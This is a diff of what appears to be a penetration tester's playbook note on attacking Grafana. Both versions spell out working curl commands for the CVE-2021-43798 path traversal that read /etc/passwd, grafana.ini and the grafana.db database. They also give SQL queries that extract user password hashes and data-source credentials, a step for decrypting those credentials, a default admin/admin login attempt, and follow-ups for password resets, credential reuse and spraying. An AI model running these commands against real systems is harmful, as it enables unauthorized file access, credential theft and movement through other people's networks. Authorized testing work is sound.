@@ -1,30 +1,31 @@
 # Grafana
 
 ## Before I start
-- [ ] Port 3000; version: curl -s http://target:3000/api/health + login page assets
-- [ ] Try admin:admin first — costs one second
+- [ ] Port 3000 by default; the version from the login page and from the health endpoint
+curl -sk <Scheme>://<WebHost>/api/health
+- [ ] admin with admin first
 
-## CVE-2021-43798 (8.0.0–8.3.0, unauth file read)
-curl --path-as-is http://target:3000/public/plugins/alertlist/../../../../../../etc/passwd
-curl --path-as-is http://target:3000/public/plugins/grafana/../../../../../../etc/grafana/grafana.ini
-curl --path-as-is http://target:3000/public/plugins/grafana/../../../../../../var/lib/grafana/grafana.db --output grafana.db
-- [ ] Any plugin ID works as the path prefix: alertlist, grafana, piechart, table, prometheus
-- [ ] --path-as-is is mandatory or curl normalizes the ../
+## CVE-2021-43798, file read with no login
+- [ ] Versions 8.0.0 to 8.3.0
+curl -sk --path-as-is <Scheme>://<WebHost>/public/plugins/alertlist/../../../../../../etc/passwd
+curl -sk --path-as-is <Scheme>://<WebHost>/public/plugins/grafana/../../../../../../etc/grafana/grafana.ini
+curl -sk --path-as-is <Scheme>://<WebHost>/public/plugins/grafana/../../../../../../var/lib/grafana/grafana.db -o grafana.db
+- [ ] Any installed plugin's ID works in the path: alertlist, grafana, piechart, table, prometheus
+- [ ] Without --path-as-is curl removes the ../ itself
 
-## Decrypt the loot
+## What the files hold
 sqlite3 grafana.db 'select email,login,password from user;'
 sqlite3 grafana.db 'select name,url,user,password,secure_json_data from data_source;'
-python3 grafana_decrypt.py grafana.db <secret_key_from_grafana.ini>
-- [ ] Datasource passwords = AES keyed by secret_key → cleartext DB creds
-- [ ] User passwords = PBKDF2 → :Pb hash-cracking
+- [ ] Data source passwords are AES-encrypted with secret_key from grafana.ini: decrypted, they are the databases' own passwords
+- [ ] User passwords are PBKDF2 hashes: :Pb hash-cracking
 
-## Admin console plays
-- [ ] Server Admin → Users → reset any password (pivot accounts)
-- [ ] Dashboards/explore → internal topology, hostnames, IPs for the report
+## As an administrator
+- [ ] Server Admin, Users: any user's password reset, for an account to move on with
+- [ ] Dashboards and Explore: the internal hosts, names and addresses the data sources reach
 
 ## If it fails
-- [ ] Traversal 404s on every plugin → patched; searchsploit grafana for the build (CVE-2024-9264 DuckDB etc.): :Pb web-cves
+- [ ] 404 on every plugin: patched, so searchsploit grafana for this build, such as CVE-2024-9264 in the DuckDB SQL expressions: :Pb web-cves
 
 ## Next
-- [ ] Datasource creds → hit the DBs directly: :Pb mysql / :Pb postgresql
-- [ ] Password reuse sweep: :Pb spraying
+- [ ] Data source credentials on the databases themselves: :Pb mysql, :Pb postgresql
+- [ ] The same passwords everywhere else: :Pb spraying
